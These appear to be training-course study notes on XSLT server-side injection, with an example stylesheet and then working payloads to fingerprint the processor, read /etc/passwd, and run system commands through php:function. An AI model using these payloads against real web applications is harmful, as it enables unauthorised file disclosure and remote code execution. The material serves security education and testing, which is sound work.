[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the `transformation of XML documents` into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically. For instance, it can select specific nodes from an XML document and change the XML structure. In the context of XSLT server-side injection, attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.
# Example
Let's take the following `XML document`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```
Here would be a simple `XSLT document` used to output all fruits contained within the XML document as well as their color 
```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```
- XSLT injection occurs whenever user input is inserted into XSL data before output generation by the XSLT processor. This enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during output generation.



# Exploiting XSLT
Suppose we can `input a text in a field that gets reflected on the page`, and the web application stores the module information in an `XML document` and displays the data using `XSLT processing`.
- We could try to inject a `broken XML tag` like `<`  to try to provoke a server error to confirm the XSLT vulnerability
![](https://academy.hackthebox.com/storage/modules/145/xslt/xslt_exploitation_3.png)
- We can try to infer some basic information about the `XSLT processor` in use w/ those `XSLT elements`. The web app should respond w/ the corresponding values to confirm XSLT vulnerability
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```
## LFI
We can try to use multiple different functions to read a local file. The success will depend on the `XSLT version` & the configuration of the `XSLT library`. 
- Reading file w/ `XSLT version 2.0`
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
- If the `XSLT library` is configured to `support PHP functions`, we can call the PHP function `file_get_contents`
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
## RCE
If an `XSLT processor supports PHP functions`, we can call a PHP function that executes a local system command to obtain RCE.
```xml
<xsl:value-of select="php:function('system','id')" />
```


